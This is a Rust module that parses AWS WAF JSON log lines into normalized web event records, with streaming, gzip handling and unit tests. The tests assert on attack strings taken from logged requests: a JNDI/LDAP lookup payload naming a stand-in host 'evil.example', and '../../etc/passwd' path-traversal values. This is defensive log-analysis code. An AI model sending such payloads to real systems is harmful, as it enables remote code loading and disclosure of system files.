use std::io::{BufRead, BufReader, Read};

use chrono::{TimeZone, Utc};
use flate2::read::GzDecoder;
use serde::Deserialize;
use thiserror::Error;

use crate::event::{HttpHeader, LogSource, WebEvent};

#[derive(Debug, Error)]
pub enum WafParseError {
    #[error("invalid JSON: {0}")]
    Json(#[from] serde_json::Error),
}

#[derive(Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
struct RawWafEvent {
    timestamp: Option<i64>,
    action: Option<String>,
    terminating_rule_id: Option<String>,
    terminating_rule_type: Option<String>,
    labels: Option<Vec<RawLabel>>,
    non_terminating_matching_rules: Option<Vec<RawRuleMatch>>,
    ja3_fingerprint: Option<String>,
    ja4_fingerprint: Option<String>,
    fragment: Option<String>,
    response_code_sent: Option<u16>,
    http_request: Option<RawHttpRequest>,
}

#[derive(Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
struct RawHttpRequest {
    client_ip: Option<String>,
    country: Option<String>,
    headers: Option<Vec<RawHeader>>,
    uri: Option<String>,
    args: Option<String>,
    http_method: Option<String>,
    http_version: Option<String>,
    request_id: Option<String>,
}

#[derive(Debug, Deserialize)]
struct RawHeader {
    name: String,
    value: String,
}

#[derive(Debug, Deserialize)]
struct RawLabel {
    name: String,
}

#[derive(Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
struct RawRuleMatch {
    rule_id: String,
}

pub fn parse_line(raw: &str) -> Result<WebEvent, WafParseError> {
    let event: RawWafEvent = serde_json::from_str(raw)?;
    let request = event.http_request;
    let headers = request
        .as_ref()
        .and_then(|request| request.headers.as_ref())
        .map(|headers| {
            headers
                .iter()
                .map(|header| HttpHeader {
                    name: header.name.clone(),
                    value: header.value.clone(),
                })
                .collect::<Vec<_>>()
        })
        .unwrap_or_default();
    let header_value = |name: &str| {
        headers
            .iter()
            .find(|header| header.name.eq_ignore_ascii_case(name))
            .map(|header| header.value.clone())
    };
    let uri = request.as_ref().and_then(|request| request.uri.clone());
    let (uri_path, embedded_query) = split_uri(uri.as_deref());
    let uri_query = request
        .as_ref()
        .and_then(|request| request.args.clone())
        .or(embedded_query);
    let uri = match (&uri_path, &uri_query) {
        (Some(path), Some(query)) if !query.is_empty() => Some(format!("{path}?{query}")),
        (Some(path), _) => Some(path.clone()),
        _ => None,
    };

    Ok(WebEvent {
        timestamp: event
            .timestamp
            .and_then(|millis| Utc.timestamp_millis_opt(millis).single()),
        source_ip: request
            .as_ref()
            .and_then(|request| request.client_ip.clone()),
        client_ip: None,
        source_port: None,
        country: request.as_ref().and_then(|request| request.country.clone()),
        host: header_value("host"),
        method: request
            .as_ref()
            .and_then(|request| request.http_method.clone()),
        uri,
        uri_path,
        uri_query,
        uri_fragment: event.fragment,
        user_agent: header_value("user-agent"),
        referer: header_value("referer"),
        headers,
        status: event.response_code_sent,
        response_bytes: None,
        protocol: request
            .as_ref()
            .and_then(|request| request.http_version.clone()),
        request_id: request
            .as_ref()
            .and_then(|request| request.request_id.clone()),
        ja3: event.ja3_fingerprint,
        ja4: event.ja4_fingerprint,
        tls_protocol: None,
        tls_cipher: None,
        waf_action: event.action,
        waf_rule_id: event.terminating_rule_id,
        waf_rule_type: event.terminating_rule_type,
        waf_labels: event
            .labels
            .unwrap_or_default()
            .into_iter()
            .map(|label| label.name)
            .collect(),
        waf_non_terminating_rule_ids: event
            .non_terminating_matching_rules
            .unwrap_or_default()
            .into_iter()
            .map(|rule| rule.rule_id)
            .collect(),
        log_source: LogSource::AwsWaf,
        raw: raw.to_owned(),
    })
}

fn split_uri(uri: Option<&str>) -> (Option<String>, Option<String>) {
    uri.map(|uri| {
        let without_fragment = uri.split_once('#').map_or(uri, |(value, _)| value);
        match without_fragment.split_once('?') {
            Some((path, query)) => (Some(path.to_owned()), Some(query.to_owned())),
            None => (Some(without_fragment.to_owned()), None),
        }
    })
    .unwrap_or((None, None))
}

/// Streams newline-delimited AWS WAF JSON records. Invalid records are yielded
/// as errors so callers can count and report them without aborting a scan.
pub struct WafLines<R: Read> {
    reader: BufReader<R>,
    line: String,
}

impl<R: Read> WafLines<R> {
    pub fn new(reader: R) -> Self {
        Self {
            reader: BufReader::new(reader),
            line: String::new(),
        }
    }
}

impl<R: Read> Iterator for WafLines<R> {
    type Item = Result<WebEvent, WafParseError>;

    fn next(&mut self) -> Option<Self::Item> {
        loop {
            self.line.clear();
            match self.reader.read_line(&mut self.line) {
                Ok(0) => return None,
                Ok(_) if self.line.trim().is_empty() => continue,
                Ok(_) => return Some(parse_line(self.line.trim_end())),
                Err(error) => return Some(Err(WafParseError::Json(serde_json::Error::io(error)))),
            }
        }
    }
}

pub fn maybe_gzip_reader<R: Read + 'static>(reader: R, compressed: bool) -> Box<dyn Read> {
    if compressed {
        Box::new(GzDecoder::new(reader))
    } else {
        Box::new(reader)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn normalizes_ja_fingerprints_headers_and_uri() {
        let event = parse_line(
            include_str!("../tests/fixtures/aws-waf/malicious.jsonl")
                .lines()
                .next()
                .unwrap(),
        )
        .unwrap();
        assert_eq!(
            event.ja3.as_deref(),
            Some("0123456789abcdef0123456789abcdef")
        );
        assert_eq!(
            event.ja4.as_deref(),
            Some("t13d1516h2_8daaf6152771_02713d6af862")
        );
        assert_eq!(event.uri_path.as_deref(), Some("/vulnerable/api"));
        assert_eq!(
            event.uri_query.as_deref(),
            Some("q=${jndi:ldap://evil.example/a}")
        );
        assert_eq!(event.host.as_deref(), Some("api.example.test"));
        assert_eq!(event.user_agent.as_deref(), Some("python-requests/2.32"));
        assert_eq!(event.waf_labels.len(), 2);
    }

    #[test]
    fn malformed_json_is_an_error() {
        assert!(parse_line("not json").is_err());
    }

    #[test]
    fn uses_aws_waf_args_as_the_query_string() {
        let event = parse_line(
            include_str!("../tests/regressions/issue-uri-query-alias/input.jsonl").trim(),
        )
        .unwrap();
        assert_eq!(event.uri_path.as_deref(), Some("/download"));
        assert_eq!(event.uri_query.as_deref(), Some("file=../../etc/passwd"));
        assert_eq!(
            event.uri.as_deref(),
            Some("/download?file=../../etc/passwd")
        );
    }

    #[test]
    fn preserves_aws_waf_uri_fragment() {
        let event = parse_line(
            r#"{"fragment":"/../../etc/passwd","httpRequest":{"uri":"/static/nbextensions/"}}"#,
        )
        .unwrap();
        assert_eq!(event.uri_path.as_deref(), Some("/static/nbextensions/"));
        assert_eq!(event.uri_fragment.as_deref(), Some("/../../etc/passwd"));
    }
}
